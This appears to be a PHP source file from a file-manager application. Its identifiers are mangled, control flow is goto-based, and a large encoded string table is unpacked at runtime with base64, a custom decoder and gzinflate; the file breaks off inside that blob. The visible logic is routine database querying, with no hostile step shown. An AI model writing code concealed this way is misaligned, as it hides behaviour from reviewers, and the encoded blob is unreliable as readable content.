$Fè­­”åœ‡[$D¾£¤Ã•ß•[$a†Ö¿ø´™[2014]]], $a†Ö¿ø´™[373] => $cò²éßŒÌ); } $AÌ×½Ô¹¨ = $Bà—Ğ’¬–Ä; } foreach ($CÂ÷›åİáÙ as &$EëÊ×•²ÂÌ) { $EëÊ×•²ÂÌ[$a†Ö¿ø´™[2415]] = array(); if (isset($CæÈ±ˆÙæÂ[$EëÊ×•²ÂÌ[$a†Ö¿ø´™[1351]]])) { $EëÊ×•²ÂÌ[$a†Ö¿ø´™[2415]] = $CæÈ±ˆÙæÂ[$EëÊ×•²ÂÌ[$a†Ö¿ø´™[1351]]]; } } goto Céˆø¶“’; B½Ğˆƒ†ô: $a†Ö¿ø´™ =& $_SERVER[ì‹É]; $Böšç…¦Ìª = array($a†Ö¿ø´™[1351] => array($a†Ö¿ø´™[7], $Fø¼âğÅõ‘)); $CæÈ±ˆÙæÂ = Model($a†Ö¿ø´™[2090])->where($Böšç…¦Ìª)->select(); goto D‚Ëõ¸‰â; BÅæÇÚœ’: $Böšç…¦Ìª = array($a†Ö¿ø´™[2014] => array($a†Ö¿ø´™[7], $EÆ—ØÅÅ–)); $Eø®‚Ú‰„ = Model($a†Ö¿ø´™[2418])->field($a†Ö¿ø´™[2419])->where($Böšç…¦Ìª)->select(); $Fè­­”åœ‡ = array_to_keyvalue($Eø®‚Ú‰„, $a†Ö¿ø´™[2014], $a†Ö¿ø´™[28]); goto f¥ïã¬´÷; Céˆø¶“’: } private function _listAppendMeta(&$cÊ³Å‹ÅÌ, $e¤•·¦ŒÃÕ) { goto e»ßñ¡öÖ‡; BŸ¿´µ«áã: foreach ($BºíãÔÛ” as &$eÇÀ—Èè¦“) { $Cá²†«Ä¥ê = array(); foreach ($eÇÀ—Èè¦“ as $AøÈÂªéî¬) { if (!in_array($AøÈÂªéî¬[$CôŠÚ¿Â—©[90]], $aòÕ»ğÚáß)) { $Cá²†«Ä¥ê[$AøÈÂªéî¬[$CôŠÚ¿Â—©[90]]] = $AøÈÂªéî¬[$CôŠÚ¿Â—©[354]]; } } $eÇÀ—Èè¦“ = $Cá²†«Ä¥ê; } $D¢š«¥”â¶ = Model($CôŠÚ¿Â—©[2421]); foreach ($cÊ³Å‹ÅÌ as &$cË¬‚»ƒÍô) { $cË¬‚»ƒÍô[$CôŠÚ¿Â—©[413]] = array(); $cË¬‚»ƒÍô[$CôŠÚ¿Â—©[2422]] = array(); if (isset($BºíãÔÛ”[$cË¬‚»ƒÍô[$CôŠÚ¿Â—©[1351]]])) { $cË¬‚»ƒÍô[$CôŠÚ¿Â—©[413]] = $BºíãÔÛ”[$cË¬‚»ƒÍô[$CôŠÚ¿Â—©[1351]]]; } if (isset($cË¬‚»ƒÍô[$CôŠÚ¿Â—©[413]][$F¡¯³‘µ¿Ÿ])) { $cË¬‚»ƒÍô[$CôŠÚ¿Â—©[2422]] = $D¢š«¥”â¶->getUserJobInfo($cË¬‚»ƒÍô[$CôŠÚ¿Â—©[413]][$F¡¯³‘µ¿Ÿ]); } } goto dŠ¦ï·ª¥…; e»ßñ¡öÖ‡: $CôŠÚ¿Â—© =& $_SERVER[ì‹É]; $F¡¯³‘µ¿Ÿ = UserJobModel::JOB_KEY; $aòÕ»ğÚáß = array($CôŠÚ¿Â—©[2395]); goto Aß‘‚í·æƒ; Aß‘‚í·æƒ: $a§ŞîÆÔÍ = array($CôŠÚ¿Â—©[1351] => array($CôŠÚ¿Â—©[7], $e¤•·¦ŒÃÕ)); $BºíãÔÛ” = Model($CôŠÚ¿Â—©[2392])->where($a§ŞîÆÔÍ)->select(); $BºíãÔÛ” = array_to_keyvalue_group($BºíãÔÛ”, $CôŠÚ¿Â—©[1351]); goto BŸ¿´µ«áã; dŠ¦ï·ª¥…: } public function userSearch($b§––°Ğ, $CÇ¦Şßç· = "\52") { return Model($_SERVER[ì‹É][469])->where($b§––°Ğ)->field($CÇ¦Şßç·)->find(); } } goto dõâ¦§ö¤ß; Eßã©ÂÂ„: if (!function_exists('_kodDe')) { function _kodDe($Eß­ò·æŸ) { $Eß­ò·æŸ = base64_decode($Eß­ò·æŸ); $BÚ”æƒ‹¸’ = strlen($Eß­ò·æŸ); $C•¾˜ÔĞïé = ''; $Fø¯“ØÏ¹¥ = ord($Eß­ò·æŸ[0]) - 30; for ($eÎ¢Èğ = 1; $eÎ¢Èğ < $BÚ”æƒ‹¸’; $eÎ¢Èğ += 2) { if ($eÎ¢Èğ + 1 < $BÚ”æƒ‹¸’) { $C•¾˜ÔĞïé .= chr(ord($Eß­ò·æŸ[$eÎ¢Èğ + 1]) + $Fø¯“ØÏ¹¥); $C•¾˜ÔĞïé .= chr(ord($Eß­ò·æŸ[$eÎ¢Èğ]) + $Fø¯“ØÏ¹¥); } else { $C•¾˜ÔĞïé .= chr(ord($Eß­ò·æŸ[$eÎ¢Èğ]) + $Fø¯“ØÏ¹¥); } } return $C•¾˜ÔĞïé; } } define("\354\213\311", "\x8d\xca\x91\x88\xb4\xdd"); $_SERVER[ì‹É] = explode("\x7c\x1\x7c\x1\x7c\x6", gzinflate(substr(_kodDe('LXwQ8fnx8fHx9PFujlH6tgwhxqo430NX7BXUZ7WDRw3AXT+nOExVp7U6BYR/f0mDo8NHg7fPR04=')."\311\166\342\24\102\271\257\226\273\234\77\107\241\341\276\312\175\204\66\100\112\13\345\276\51\55\51\11\224\226\243\120\256\122\350\77\367\314\112\62\320\217\326\321\314\233\67\263\163\274\171\363\146\346\275"."\x37\x6f\x5e\x76\xe5\x43\x93\x3b\x82\xff\xed\x7a\xf9\xa9\xf8\x77\x72\xa7\xc9\x9d\x27\x7f\x84\xc3\xc7\x9c\xb9\xfb\xe\xe8\xbf\x9d\xb3\x4b\xfb\xfc\x3b\xd5\xef\xdb\xf7\xe2\xf9\x9b\x4e\x3c\x7f\xf6\xce\xa7\x8f\xed\x2d\x55\x8f"."\134\60\353\303\47\274\361\347\57\50\256\76\342\270\137\151\17\236\173\350\117\36\232\363\202\72\270\371\272\117\127\265\34\363\321\323\267\157\176\374\355\117\362\237\235\270\177\223\173\103\362\226\271\47\315"."\332\147\362\361\326\175\217\10\274\27\272\375\201\327\253\73\307\237\373\315\233\257\77\342\160\234\73\374\306\27\273\137\166\160\207\371\321\33\277\136\233\314\157\154\276\357\67\177\136\372\337\117\152\17\271"."\xac\x79\x73\x5b\x7c\x6b\xf3\x2e\xf9\xbd\x8f\x72\xaf\xd5\xab\xf7\x8c\xdf\xbf\xdb\x2b\x83\x5d\xbf\x6d\xfb\xd6\x98\xfe\xe8\xd7\x47\xde\xbb\x3a\x76\x86\xcb\x3d\xb2\xeb\xba\x7d\x1f\x5b\xf7\xf4\x43\xf\xbc\x37\xd8\xfd\x8e\xba".strrev('Z?ÍÁÖ÷2Ù{œüİ›Øò]f¿OEµñıCWÉ¯ıƒÇx‰«ó\'Ü{íŸµ£á``Òû').strrev('ºšõ+iÛ¸»å|ü×Y×`³Ü×YüòMñ’ë¬eŞC}‡İp>§¹Îr}§‰»çûO¬èu²}')."\x47\x96\x1d\xde\x9f\x3a\xf2\xe3\xda\xab\xba\x9c\x6f\xec\x3c\x29\xdf\x72\xd0\x98\x7e\xe5\x21\x1f\x6d\xce\xf5\x5d\xff\xc8\xdb\x97\xff\xf4\x9c\xba\x7d\xae\x7e\xeb\xa6\x1d\x8e\x38\xf0\xf0\x65\xc6\x8c\xbf\x9b\xff\xef\xa6\x5".base64_decode('K98/8J4DzrvvXMdxJ88+9dGxk2/aduKS5485d+6ag5/ZaYcdcCe34B8pp1uSOq6ZlokBcT2X1A==')."\122\70\254\345\360\257\13\377\230\243\31\315\122\161\70\332\357\17\107\103\3\201\200\67\30\216\222\22\305\364\254\236\40\241\274\142\50\131\122\170\136\65\114\360\51\261\270\150\136\317\253\71\33\204\3"."\22\212\245\304\24\223\224\344\351\210\172\274\201\136\377\212\150\170\105\300\113\60\142\321\321\202\152\114\340\30\12\206\54\305\260\302\132\126\145\30\143\6\253\127\207\267\333\327\57\205\203\356\376\220\273"."\63\354\363\367\143\160\247\277\257\317\27\56\207\7\375\275\275\35\356\316\45\345\51\201\240\273\273\317\55\201\372\145\324\250\226\113\352\325\322\152\234\262\132\252\301\201\56\115\315\44\160\60\247\320\352"."\x58\x13\x79\x12\xa\xb3\x10\x18\x83\x5c\x21\x93\xc1\x91\x7e\x16\x22\xf5\x57\x93\x4a\x21\x43\xfa\xcc\x23\x46\xf2\x86\x96\x55\x68\xd3\x97\xa8\x13\xc\x8a\x3\x4a\xc1\xd2\xb5\x5c\x1c\x47\xbc\xe3\x96\xa1\x70\x38\xa8\x71\xdc"."\120\263\152\216\24\25\362\366\172\73\303\22\254\246\324\25\364\367\111\144\50\262\212\151\251\206\64\330\343\15\172\45\130\365\326\331\250\305\263\45\234\157\240\37\164\210\344\356\355\225\246\52\301\122\263"."\171\132\14\316\123\241\60\177\320\343\15\112\35\53\44\336\117\161\75\233\325\163\116\120\12\30\117\113\250\252\67\30\304\1\231\120\160\257\17\16\35\211\370\273\272\102\136\26\43\215\133\332\13\152\322".base64_decode('SKjUFkskM1a0qGQKlFhH8O9s8kN+dZMQ8KiW0wqEWEkRum5SkjfZHCIBlQZyDAkUoJPZBaZaEQ==')."\x7\x5b\xdb\xf0\xef\x42\x82\x14\x8b\xc2\x34\xd5\xb0\xa2\x6a\x2e\xae\x27\xb4\x1c\x99\x90\xed\x64\xf2\x11\x12\x54\xac\xb4\xc7\xd0\x0\x1e\x29\x50\x77\xc6\xf5\xfc\x44\x9f\x5e\x24\xad\x49\x6a\x19\xb5\x97\xcd\xb7\xa4\x9e\x49".strrev('"X/ã¾Ô!ªB$®Œù¦´˜feª±Ië0»ôÓ ÂLµ§Ed/îä+[K4…1vAç¨')."\260\200\320\272\164\43\353\1\254\200\364\16\230\0\332\100\205\204\21\72\5\22\102\247\340\22\350\60\166\246\13\271\221\20\153\242\23\377\270\252\207\66\70\276\35\36\132\14\376\251\41\314\56\102\352"."\235\126\63\231\250\72\256\222\171\224\115\64\233\264\151\56\63\246\345\134\0\202\243\76\177\64\255\230\351\276\104\163\24\345\42\315\312\45\324\161\147\76\235\47\204\300\146\67\41\160\70\12\375\272\345"."\x15\x58\x70\x46\x8f\x2b\x4\x29\x6d\x59\xf9\x90\x9a\x4b\xc0\xae\x21\x6d\xd3\xc7\x72\xa8\xeb\xf2\xaa\x4a\x9a\xe5\x91\xa5\x84\xd4\x27\xad\x90\x7a\x5a\xb4\x16\x46\x8c\x9\x2d\x39\xc1\xb9\x60\xda\xca\xb2\x22\xb3\xb4\x69\xc"."\146\62\240\65\116\250\243\212\304\325\161\213\364\210\264\60\236\126\14\60\220\255\5\53\351\230\217\201\112\76\237\321\342\212\245\351\71\227\36\267\124\313\141\132\206\252\220\322\252\26\112\220\66\340\254".base64_decode('rsW56Izq1HMWmNKOsKHkzKRqOLyE0Fsk0KmMq1E0j2bmdVODn2mRFMtS4mnIEXjxrd+Br+UyWg==')."\x4e\x2d\xc3\x75\xc7\xe3\xaa\x69\x3a\x60\x16\x43\xcf\x38\xdc\x99\x8c\x3e\xe6\xf0\x1b\x5a\x4a\x3\x79\x6a\x4b\xaa\x9\xb8\x55\xb\x61\x27\xde\xf1\xbc\x66\xa8\x26\x8d\x4a\xdd\x7d\x61\x82\xc\x6a\xa5\x3a\x2\x86\x92\xca\x2a"."\x2d\x52\xbe\x10\x3\x3d\x43\x66\x6a\x5\x18\xc6\x26\x5f\x6f\x91\xe2\x30\x2a\x4b\xd9\x82\x69\x39\xc\x15\xb0\x24\xd\x2c\x7e\x64\xf0\x7c\x49\x47\x1f\x1c\x4f\x4d\x4d\x38\x42\x80\x73\x13\x70\x63\x5d\x93\x4\x48\x47\xa2\x69"."\30\332\23\16\7\242\276\56\260\100\367\173\243\175\356\160\147\17\251\266\245\244\150\235\173\1\77\146\105\122\340\162\7\230\174\220\320\372\101\37\161\140\100\37\123\15\360\341\216\211\26\151\104\117\304"."\364\161\47\115\202\310\160\62\121\144\330\243\171\313\21\124\162\51\330\77\261\11\113\45\344\30\362\6\227\171\203\321\220\277\53\74\350\16\222\265\73\7\172\172\234\226\5\363\146\34\101\65\1\372\66"."\x6e\xd1\x12\x95\x3c\xec\x16\x8a\x3\x67\x2\x1c\x44\x9a\xa\x67\x7\x4d\xeb\xf5\x75\xc3\x96\x7b\x1c\x26\x40\x72\x88\x58\xb4\xec\x5e\x2d\xab\xc1\xca\x59\x2c\x5\x75\x15\x58\xd8\xbb\x49\x85\x5c\xa8\xc6\xad\x91\x74\x6d\x75".base64_decode('JDGnxgH+ra0ZinictcPtLo3ncdU766WGurlSAEgampKRCJmUYdRJ/iV2QupVcykrTYSvoHfpgA==')."\x37\x14\x8e\xf6\x79\xc3\x3d\x7e\xf\xc9\xed\x75\x93\x50\xaf\x8e\xe7\x15\xad\xed\x10\xfe\x19\x26\xdd\xf\xd6\xfe\x94\x1a\xd7\x33\xba\xa1\x64\x20\xc7\xa0\xc4\xa2\xd2\x19\x9c\xd2\x92\x93\x8c\x3d\xfb\x80\x84\x42\x3a\xd\xf3".strrev('juš%¢¡VzÎğF¡]úñº³,‘qj'."\r".'Ñ)lè§Œ0'."\n".'p/A	ºV.å<Ùi	(').strrev('I¡“PŞ^u‘Rò'."\0".'Qt«J^Ò£5	–´n¬'."\n".'•iRŸÔ\'ZV©ô¡°Ô!ÒÃ,›_'."\n".'¨ô¥µª;O')."\40\40\1\70\147\241\232\31\4\231\240\300\102\343\203\120\256\344\0\213\163\133\305\344\34\33\106\204\5\266\153\240\267\67\332\351\357\17\3\331\22\103\6\203\276\260\227\122\204\333\23\165\167\6\46".base64_decode('6WLDh4kgwLllJykuRxYbJjnT5tyd80tSccQPcRgwsryeM1VHnJSW4JwTYywsYZtlObhEO+5Qsg==')."\x6b\x1d\x59\xd5\x52\x1c\xac\xea\xf6\xc5\x49\x22\xac\x12\xaf\xca\x3e\x32\x4\x9c\xd3\x65\xc0\x2a\x8\x36\xc\x74\x25\xc\xf8\x43\x24\x43\x3b\x84\x2\xa1\x22\xa6\x1a\xa4\x1e\x81\x1\x92\x94\x15\x86\xbf\xdb\x4b\x80\xd3\x8"."\305\244\225\172\102\53\203\41\312\245\12\0\337\320\326\52\274\215\355\264\76\244\354\361\154\206\313\111\121\315\66\176\121\75\266\6\160\50\100\164\112\245\126\73\370\130\205\173\174\375\113\242\175\176\217"."\267\67\352\353\7\54\60\134\16\37\10\170\334\164\360\105\170\207\77\334\143\203\16\0\76\261\314\335\353\53\105\367\56\367\205\302\241\212\111\0\66\340\55\111\1\173\250\100\320\333\345\133\316\242\135"."\76\157\257\47\24\355\164\167\366\160\234\176\167\37\211\104\223\160\27\143\272\354\370\121\300\315\103\154\57\24\55\302\175\35\355\314\250\155\343\21\245\42\165\224\323\11\130\171\124\102\233\244\271\160\67"."\211\132\102\104\333\270\136\240\324\312\304\255\54\145\20\131\205\314\120\245\110\344\342\152\374\123\43\271\103\222\225\47\145\0\126\20\233\140\101\324\14\32\7\362\25\371\276\104\230\157\131\15\242\20\247".base64_decode('Q03qhvpdAHfSYoRREgfzhqeBEXCjbSugBDQiUToXTSDmu2l1knzLGPWDvbUbbjijg0F/fzfJMA==').base64_decode('llZpBXyk+6upJEL2nRZnSUCMULhESDt9jU67chL/HIt/gORFPq7maK/HIGNmjINuJcBsoUxVLw==')."\xb0\xaf\xc5\x74\x9d\x7c\x21\x3\xd7\xda\x49\xca\x2f\xd8\x8e\x75\x8d\x49\x89\x64\x9c\x32\xa7\x39\xe4\x83\xe3\x64\x71\x8\xfb\x97\x78\xfb\xa3\x94\xb2\x70\x4c\xa0\x46\xc\x0\x7b\x40\x7f\x90\x74\x88\xa5\x8f\xd0\x7d\x8\x4e"."\14\172\103\224\13\30\352\150\101\243\335\345\162\316\41\124\254\202\365\207\174\336\265\52\62\66\247\172\310\61\307\71\14\2\65\265\213\161\224\304\42\116\133\164\46\311\137\60\130\156\50\202\124\233\355"."\65\55\21\127\304\125\335\336\62\344\166\254\125\34\153\353\34\13\34\303\163\42\316\232\71\4\60\274\256\101\156\132\17\21\0\142\373\214\141\360\323\32\151\237\25\161\34\373\223\325\213\207\42\303\263"."\133\346\114\217\70\147\104\306\206\153\153\332\351\167\342\5\3\354\261\342\23\254\252\211\71\325\240\112\100\64\141\50\71\304\22\5\4\232\260\126\313\163\350\272\271\353\51\34\214\241\232\342\71\206\34"."\x91\x39\xc3\xed\x42\x3e\x1\x54\xfa\x2d\x20\xba\x0\xfe\x9c\x66\x78\x6e\xc7\x4a\xd8\x32\x96\x15\xce\x7b\x42\x1f\x85\x5c\x9c\x73\x57\x38\x2f\x62\x4a\x9c\xf0\x1\x2d\x95\x63\x53\x8\x2c\xe8\x6c\x6f\x6b\x17\x79\xd7\xcd\xc2".strrev('‚EG^øÈÒ±	$>è8€âÛ€’•1­Sô¢İ%N{½Ò§!gPƒ*Ã,ºT¦@éë¿').base64_decode('P2lFPgrFrjEWS6g5Mk57EGwzruTVkNDCaDTs7uj1RimHIZyYxhFX7GCnXaBpnKOyTSMXh6Ni5w==')."\xe5\x15\x2a\x15\xc0\x6d\x25\x5b\xe9\x5d\xd5\x91\x48\x61\x48\x4d\xc\xf\x1\x82\x54\x1c\xc9\xe1\x75\x8d\xeb\x6b\xa8\x24\xeb\x8a\x80\xff\x68\x4\xf3\x21\xf2\xe5\x3c\x1f\x7\x13\xc8\x4c\x71\x2\x77\x57\x38\x38\x8a\x32\x4e"."\6\253\300\166\375\272\301\326\113\10\347\322\247\245\133\112\206\241\301\264\60\204\220\176\147\153\56\331\34\343\201\350\345\314\4\256\262\302\261\32\342\164\375\354\314\110\70\310\141\147\1\166\230\54\104".strrev('8J±A¬.!–ŠX7&Ç«ˆÁzš…¡˜'."\n".'Jg&D|;—¸¸È8óãºù;¶€rÔ›£d­¿ñ')."\4\215\220\341\131\200\14\227\111\31\10\160\62\74\211\221\271\20\52\363\55\275\314\104\112\231\110\232\62\57\235\4\175\36\131\63\75\110\342\225\151\125\255\64\334\27\147\224\11\31\127\273\127\55\252"."\31\231\126\132\246\155\221\151\305\145\264\163\360\220\112\14\0\12\41\225\100\101\60\335\323\62\34\20\70\272\264\24\30\244\255\147\342\261\314\105\147\71\145\350\205\174\200\176\111\210\341\312\20\0\257"."\51\3\4\165\335\222\351\126\206\5\372\30\57\201\325\341\241\145\174\234\171\355\47\351\102\110\232\200\343\245\165\300\120\230\336\245\24\305\161\255\70\306\71\73\75\360\3\114\176\274\306\5\237\322\55"."\105\351\51\15\357\104\136\211\260\222\12\11\237\7\273\170\372\155\14\16\252\361\211\70\337\223\170\204\115\216\75\306\306\31\321\132\45\202\251\74\316\214\32\246\355\261\7\45\132\116\53\204\104\154\4"."\x35\x25\xe1\xf2\x56\xf9\xf3\x7c\x7d\x80\xd3\x3e\x4\x76\x90\xc2\xc4\xa6\x20\x3f\xe7\x23\x5\xb2\x9e\x29\x26\x91\x2c\xe1\x49\x18\x9\xa9\x14\x26\x54\x9b\x36\xda\x56\x2e\x8c\xf2\x49\x47\x5b\x26\xc1\x2\x48\x6\xc4\x61\xe1"."\10\70\370\60\12\121\362\243\351\121\334\235\321\54\333\7\260\376\55\341\63\260\273\3\132\156\102\313\211\73\155\16\345\234\215\17\74\44\141\36\303\175\74\125\30\263\15\276\223\227\311\16\137\6\273".strrev('3‘J’ĞBeZËÄ‚<é—¼­3hJÄ!µ¥S`sŸ(öÉ:sRT”Ô*Ì=¨)ñ¡¼')."\x75\x5b\x1e\x81\xfa\x4d\x6b\x82\x1d\x4a\x8\x41\x7b\xa1\x38\xea\x99\x2a\xd2\xc3\xf6\x6a\x95\xa2\xe2\xb4\xd3\xcc\x5e\xd0\x9b\x95\xc2\xa8\xa5\x61\xbd\x62\x14\xad\xe1\x12\x58\xbd\xe9\x81\x15\x15\xc6\xa3\x25\x87\x2\x20\x2a"."\214\124\324\166\176\200\253\341\146\354\15\210\41\31\60\2\206\23\116\222\156\310\274\150\337\340\151\114\153\2\31\46\16\13\110\371\122\76\147\343\307\42\16\215\225\162\344\22\150\111\224\177\324\306\156"."\370\134\262\225\102\17\213\352\112\132\146\201\215\104\114\61\234\6\50\215\177\204\263\154\42\36\24\30\140\270\24\303\234\60\55\65\333\253\123\251\23\322\256\67\241\131\20\2\71\221\116\217\207\70\242"."\xc0\x86\x19\x4c\x28\x10\x35\xc7\x59\xd6\x7f\x19\x6d\x84\xe4\x92\x67\xd9\x30\x2b\x31\x5f\x67\x2d\xe2\x97\x4e\xbe\x36\x88\x2b\x8b\x78\xd\x3\xd1\x78\xcb\xe1\xb5\xe\xe\x9\x57\x99\x59\x76\xcf\x83\x80\x4e\xd3\xd2\xf3\x3c"."\x45\x88\xe2\x64\x21\x89\x17\x2a\x60\xb1\xce\x47\x35\x4\xdc\x3b\x81\xd6\x6f\xde\x85\x8\x97\xe4\x45\xb2\x2a\x26\x4c\x67\x6\x60\x38\x79\xad\x7d\x1e\xb7\x61\xd0\x1\xc6\xcd\x83\x67\x25\x0\x28\x82\xe0\x54\xb\xd1\xb3\xba"."\x4a\xdc\x14\x17\xee\x2d\xf2\x2b\x4a\x5c\x14\xfc\xb0\x13\x2f\x2e\x4e\x25\x91\xf0\xd3\x83\x2c\x31\x5c\x8e\x2a\xee\xdb\x2b\x17\x84\x6e\x8d\x59\x51\x42\xac\x32\x3a\xd8\xb1\xf3\x8b\xa7\xd2\xf8\x94\x59\xf0\x3c\x13\x33\x89\x90"."\51\263\165\41\331\224\36\360\127\202\61\231\253\253\204\206\370\142\307\57\366\112\45\121\73\343\370\76\161\251\154\6\360\1\255\34\207\274\55\255\345\124\223\255\52\206\131\211\107\174\237\110\142\223\112".strrev('2ê-ÃüÁˆmƒæÊˆ;%¶ZˆÉhs,#¾pQ€5Ä'."\0".'.ÀoLÑSşHVìW7Œ¥}(ˆBí').base64_decode('9KzPD+ZXZaIrxVPpKQ1iauNs0yRmAkQCV5CpyqTJrCi+3DzwKP5944oHbvzz+Tjc0Eg49OROkw==')."\273\200\377\241\60\127\323\71\171\371\72\375\215\227\17\332\155\327\177\255\373\145\137\374\276\125\216\320\376\216\323\377\336\340\171\171\363\105\216\241\73\147\56\274\255\371\261\131\23\65\317\127\115\324\174".strrev('túoGu£èxÍ;‡Öf«¦ãçqé½Şİ|q¯gÕğ=/W¯a=^8§Íå]òÖ-íÈÌ€çıyüò')."\341\273\323\374\353\117\75\364\313\177\356\163\364\246\317\276\274\45\362\311\325\33\76\70\366\226\3\76\170\312\175\341\103\47\116\273\376\312\263\366\74\352\232\351\277\72\165\313\176\173\153\375\233\217\335"."\x63\xf5\x5d\xad\x9d\xbb\x3e\x9f\x58\x51\x3b\x7d\xd6\x61\x7b\x68\x8b\x4f\xef\x3c\x76\x7e\xcf\xbf\x7f\xf7\xc5\xba\x73\x2f\xfe\xf5\xfa\xd9\x87\xbf\xfe\xe3\x6c\xfd\x85\xff\xf9\xf3\xd3\xf2\xfc\xe9\xf\x5d\x37\x63\xcb\xd2\x6b"."\367\335\355\306\303\46\244\347\367\236\76\143\372\227\371\337\351\103\373\336\172\143\350\262\361\346\173\216\70\366\134\337\127\35\127\170\216\336\145\217\31\307\355\344\354\136\26\371\311\177\227\336\166\324\352"."\213\3\162\223\125\327\173\362\271\117\74\160\173\363\356\317\366\356\165\324\320\226\327\166\74\144\267\316\313\217\366\124\115\377\351\7\311\67\237\35\71\362\350\346\177\357\374\331\306\127\216\333\165\156\346".base64_decode('mUdfuFz/6oitq0YPGflR2x6/uWDHo290XvPAddOG5x193N+nrWy/6db2L/92yr/fPvzyHY954Q==')."\336\376\271\333\356\254\232\321\272\317\313\163\233\365\320\15\75\33\303\135\117\236\266\241\357\215\235\337\376\174\341\147\277\174\356\230\23\264\21\355\332\227\26\364\274\376\306\7\177\134\166\367\55\311\123"."\17\316\374\75\75\263\372\222\155\347\305\252\76\336\232\70\362\222\344\35\63\347\354\162\330\137\256\175\315\131\373\344\365\27\270\56\152\376\370\305\303\334\301\125\256\236\63\142\277\75\174\244\230\274\164".base64_decode('mvMPu7x68pvK8p/ffd6qV+XfDr982kVzgqvOTTw7e9fAhy8+cf6R/4xHTvrx8vonf9c8yzfn4g==')."\xda\xaf\x9e\x5a\x7b\x6a\xdd\xa2\xcf\x67\xc\x6f\x99\x7e\xe8\xc2\x5f\xdf\x72\xc0\xf5\x1b\x82\xd5\x97\x55\x9f\xf9\x4e\xe4\x13\xed\x8d\xe9\xd9\xd7\xcf\xf9\x78\x74\xe3\xd0\xf2\xc6\x7f\x4d\x6b\xa8\xef\x59\xf6\x51\x4b\xfa\x94"."\237\376\350\375\5\67\17\45\16\71\347\363\215\207\125\37\167\372\223\67\17\74\372\341\236\107\377\345\331\157\345\137\276\372\301\123\336\123\67\76\266\303\137\362\155\205\23\42\227\177\360\312\350\356\313"."\x3e\xaf\x9b\xbb\xe6\xe0\x97\xbb\x9b\x37\xcc\x6d\xdd\xf3\xa9\xdc\xa3\xd2\x2d\x9b\xf\x6b\x9b\xb6\x79\x8f\x3d\xce\x5a\xf5\xce\xa3\xfb\x1f\xb2\x6e\xbf\x57\x9f\x48\x3e\x3a\xf2\x9b\x5b\xe\xd8\xb5\xfe\x98\xbd\x46\x2f\x3b\xad"."\x67\x5b\xe7\x3f\x9e\xd8\x6f\xd6\x4f\x2e\x6a\x5c\xf9\xef\x8e\x7b\x9f\xb8\xe5\x17\xd6\xd8\xc6\x1f\xbf\x5e\xff\xa3\xc6\xcd\xb3\xb2\xff\xa8\x7a\xe3\xb0\xa7\x26\x8f\xf6\x9e\x32\xb2\x6e\xe7\x1f\x9b\x1f\x9c\x22\x9f\xf4\x9f\xa3".strrev('ı_EÏ!Ğò}ªñ~®ºÖOÛëÚbıwóùê§ß¹?oGĞúÉÏ—ší¿>&ÇC×bü'."\r".'7§')."\333\300\325\47\357\364\346\75\17\77\267\363\33\357\66\375\365\222\317\367\115\326\137\167\317\274\177\374\164\254\367\300\5\77\336\273\367\365\35\376\170\262\143\372\273\307\256\163\276\163\302\131\267\337\273".strrev('İò«çz·7Æ{Û®ÛÃ`r¼ö§›ô]—ë•şsÿoïk«Ãü_›ÛúívWûÖÚiÿ¸ïÓè')."\x70\xfa\x44\x9d\x6a\xf5\xa4\x5b\xe\xb0\xcc\xad\xf\x26\xeb\x17\x5e\xbf\x4b\xe4\x9d\xc3\x2f\xf3\xc5\x6f\x7a\x5d\x7f\xe9\xc5\x5c\xe1\xf6\xf3\x9b\x53\x87\xec\x7b\xc5\x59\x57\x6c\x95\x12\xf7\x36\x3d\x14\xfa\xcb\xbe\x7\x6e"."\75\357\346\230\377\220\372\337\334\232\274\151\345\225\276\203\357\371\345\276\33\235\147\175\164\325\263\153\263\122\327\101\322\341\23\247\374\76\175\351\375\376\103\147\152\313\143\327\36\164\337\75\221\330\143"."\352\166\165\357\142\347\11\373\237\63\160\327\212\306\213\316\335\166\361\206\17\266\236\274\343\205\167\356\167\341\211\357\24\17\335\262\333\356\303\177\326\217\332\370\122\361\101\163\60\133\70\357\216\7\317"."\x76\xdc\xfd\xca\xdf\xf6\xbc\xe8\xf4\xe7\xdc\x91\x57\xc7\x6f\xce\x3e\x38\xf7\xc8\xd8\x9a\xbb\x42\x33\xdf\x3e\x6f\xe6\xe0\xbf\xac\x1d\x43\x7\x7f\xb2\xf2\xcb\x53\x7e\xdd\xe2\x7f\xf5\xca\xd3\x9e\xeb\xb9\xf9\x74\xef\x51\x1f"."\x57\x9f\x71\xd3\x2e\xb5\xbf\x7e\xbb\xd6\x95\x3e\xff\xe6\x8f\x66\x9f\xd1\x71\xcf\xf3\x27\xde\x70\xf5\x5\xbf\x5f\xb9\xf4\xc4\xcb\xf3\xfb\xdf\x99\x5d\xa1\x37\x5c\x95\x4e\xfc\xfe\x3a\x63\x78\xeb\x36\x6b\xeb\x33\xcb\xef\x58"."\xfd\x5c\xe4\xf2\x6b\x1f\xde\x77\xcb\x23\xfd\xda\x9d\x17\xde\xb6\xfb\x9c\x17\x46\xe6\x1e\x1e\xfb\x6c\x24\x24\xbf\x58\xf3\xfc\x6d\x6f\xbc\xb7\xe5\xa0\xe7\x5e\xfe\xc7\xa5\x2b\xce\xbc\x6f\x7e\xf2\xd9\x91\xeb\x87\x7b\x9f\x3b"."\372\312\307\323\173\157\112\371\216\73\355\266\276\165\177\156\37\330\264\352\226\127\365\75\137\173\355\362\137\34\352\72\342\372\35\17\76\366\332\145\343\67\136\360\331\235\327\347\137\111\124\75\125\165\100".strrev(';œvcÅôU{9m7'."\r".'ÊôÜ¿%Óº5=AÌ÷œûÂÿ{~½_£é?ÎËŒëùN·qÛwÑ–áçó')."\xfa\xe8\x86\x7b\x1b\xf\xb5\x5e\x5a\x75\xed\x6b\xef\x35\xaf\x95\x36\x9c\xbc\xe8\x67\xa9\x57\x5f\x76\x1f\xff\xe8\x56\xcf\x2d\x1f\x84\xf7\xd9\xfb\xf0\x6c\xa0\xdb\xb3\xa9\x73\xf9\x51\xf\xfc\xac\xab\xe6\x91\xb7\xba\xb6\x5f"."\x71\xd9\xe3\x27\x7e\xf8\xf3\xdd\x1f\x5b\xb5\xce\x1a\x79\x66\x71\xe1\xaf\x8f\x1d\xfe\xf4\x6c\xf5\xb5\xd\xb5\x3\xb\x55\xef\xb5\xf2\x85\x85\xbb\x22\xa7\x7c\xba\xff\x85\xe7\x35\xe8\xb3\x1e\x79\xb7\x78\xde\x2e\x6f\xfc\xd3"."\x3b\xe7\xed\xf7\x8a\x77\xe6\x1e\x5f\x7c\xe0\x9f\xfe\xf8\xbb\x67\x67\x5d\x7e\xcb\xd9\x55\xf\x6e\xac\xbe\xec\xa3\xb7\x8e\xfb\xf7\x58\xee\xfd\xae\x3b\x